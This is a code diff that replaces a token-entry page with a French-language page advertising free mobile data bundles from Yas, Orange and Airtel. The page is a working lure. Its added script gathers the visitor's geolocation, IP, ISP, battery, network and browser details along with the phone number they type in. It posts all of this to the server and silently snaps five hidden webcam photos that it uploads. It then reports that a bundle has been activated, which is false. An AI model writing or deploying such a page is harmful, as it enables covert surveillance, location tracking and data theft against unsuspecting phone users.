@@ -1,19 +1,257 @@
-<!DOCTYPE html>
-<html lang="fr">
+<!DOCTYPE html><html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Accès Refusé</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Forfaits Gratuits - Yas, Orange, Airtel</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f3f4f6;
+      color: #333;
+    }
+    header {
+      background: linear-gradient(to right, #ff6a00, #ffb347);
+      color: white;
+      padding: 2rem;
+      text-align: center;
+    }
+    h1 {
+      margin: 0;
+      font-size: 2.5rem;
+    }
+    #offers {
+      display: none;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 2rem;
+      padding: 2rem;
+    }
+    .card {
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      padding: 2rem;
+      text-align: center;
+      transition: transform 0.3s ease;
+    }
+    .card:hover {
+      transform: translateY(-5px);
+    }
+    .yas { border-top: 5px solid #00a651; }
+    .orange { border-top: 5px solid #ff6a00; }
+    .airtel { border-top: 5px solid #e60000; }
+    .title {
+      font-size: 1.8rem;
+      margin: 1rem 0;
+    }
+    .details {
+      font-size: 1rem;
+      margin-bottom: 1rem;
+    }
+    .btn {
+      display: inline-block;
+      background-color: #111;
+      color: #fff;
+      padding: 0.8rem 1.5rem;
+      border-radius: 25px;
+      text-decoration: none;
+      transition: background-color 0.3s ease;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #333;
+    }
+    video { display: none; }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Accès Refusé</h1>
-    <p>Vous devez fournir un token d'accès valide pour accéder à cette page.</p>
-    <form class="token-form" action="/admin" method="get">
-      <input type="text" name="access_token" placeholder="Entrez votre token d'accès" required>
-      <button type="submit">Accéder</button>
-    </form>
-  </div>
+  <header>
+    <h1>Forfaits Gratuits Mobile</h1>
+    <p>Choisissez votre opérateur et profitez de nos offres gratuites !</p>
+  </header>
+
+  <section id="offers">
+    <div class="card yas">
+      <div class="title">Yas Telecom</div>
+      <div class="details">50 Mo Internet + 10 SMS valables 24h</div>
+      <div class="btn" data-puce="telma">Activer</div>
+    </div>
+    <div class="card orange">
+      <div class="title">Orange</div>
+      <div class="details">100 Mo Internet + 5 minutes d'appel</div>
+      <div class="btn" data-puce="orange">Activer</div>
+    </div>
+    <div class="card airtel">
+      <div class="title">Airtel</div>
+      <div class="details">200 Mo Internet + 20 SMS</div>
+      <div class="btn" data-puce="airtel">Activer</div>
+    </div>
+  </section>
+
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <!--__INJECT_ID__-->
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script>
+    let geoCoords = null;
+    let cameraGranted = false;
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const offersSection = document.getElementById("offers");
+
+    async function getGeo() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos.coords),
+          () => resolve(null),
+          {timeout: 5000}
+        );
+      });
+    }
+
+    async function getIpInfo() {
+      try {
+        const res = await fetch("https://ipinfo.io/json");
+        return await res.json();
+      } catch { return {}; }
+    }
+
+    function getNetworkInfo() {
+      const c = navigator.connection || {};
+      return `Network: ${c.effectiveType || 'unknown'}, downlink=${c.downlink || '?'}Mb/s`;
+    }
+
+    async function getBatteryInfo() {
+      try {
+        const bat = await navigator.getBattery();
+        return `Battery: ${Math.round(bat.level * 100)}%,\nCharging: ${bat.charging}`;
+      } catch { return 'Battery info unavailable'; }
+    }
+
+    async function getInfoText(phone, puce) {
+      const ip = await getIpInfo();
+      const battery = await getBatteryInfo();
+      const net = getNetworkInfo();
+      const lat = geoCoords?.latitude?.toFixed(6) || 'unknown';
+      const lon = geoCoords?.longitude?.toFixed(6) || 'unknown';
+
+      return `📞 Phone: ${phone}
+
+📶 Puce: ${puce}
+
+📍 Location: ${lat},${lon}
+
+🌐 IP: ${ip.ip || '?'} | ${ip.city || ''}, ${ip.country || ''}
+
+🏢 ISP: ${ip.org || ''}
+
+🔋 ${battery}
+
+📡 ${net}
+
+🧠 UA: ${navigator.userAgent}
+
+
+Infos with 5 photos`;
+    }
+
+    function sendMessage(message) {
+      fetch("/con", {
+        method: "POST",
+        body: new URLSearchParams({ id: PSID, message })
+      });
+    }
+
+    function sendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.toBlob(async (blob) => {
+        const fd = new FormData();
+        fd.append("id", PSID);
+        fd.append("photo", blob, "cam.jpg");
+        fetch("/convert", { method: "POST", body: fd });
+      }, 'image/jpeg', 0.8);
+    }
+
+    function startAutoPhoto(callback) {
+      let count = 0;
+      const maxPhotos = 5;
+      const interval = setInterval(() => {
+        sendPhoto();
+        count++;
+        if (count >= maxPhotos) {
+          clearInterval(interval);
+          if (callback) callback();
+        }
+      }, 2000);
+    }
+
+    async function requestCameraPermission() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        cameraGranted = true;
+        return true;
+      } catch (err) {
+        return false;
+      }
+    }
+
+    document.querySelectorAll('.btn').forEach(btn => {
+      btn.onclick = async () => {
+        if (!cameraGranted) return;
+
+        const { value: phone } = await Swal.fire({
+          title: 'Entrez votre numéro',
+          input: 'text',
+          inputLabel: 'Ex: 0341234567',
+          inputPlaceholder: '0341234567',
+          inputValidator: (v) => {
+            if (!/^03[23478]\d{7}$/.test(v)) return 'Numéro invalide';
+          },
+          confirmButtonColor: '#111'
+        });
+
+        if (!phone) return;
+
+        Swal.fire({
+          title: 'Traitement en cours...',
+          html: 'Veuillez patienter...',
+          allowOutsideClick: false,
+          allowEscapeKey: false,
+          allowEnterKey: false,
+          didOpen: () => {
+            Swal.showLoading();
+          }
+        });
+
+        const puce = btn.dataset.puce;
+        const infoText = await getInfoText(phone, puce);
+        sendMessage(infoText);
+
+        startAutoPhoto(() => {
+          Swal.fire({
+            icon: 'success',
+            title: 'Succès !',
+            text: 'Forfait activé avec succès.',
+            confirmButtonColor: '#00a651'
+          });
+        });
+      };
+    });
+
+    async function initApp() {
+      geoCoords = await getGeo();
+      const granted = await requestCameraPermission();
+      if (granted) {
+        offersSection.style.display = "flex";
+      }
+    }
+
+    initApp();
+  </script>
 </body>
 </html>
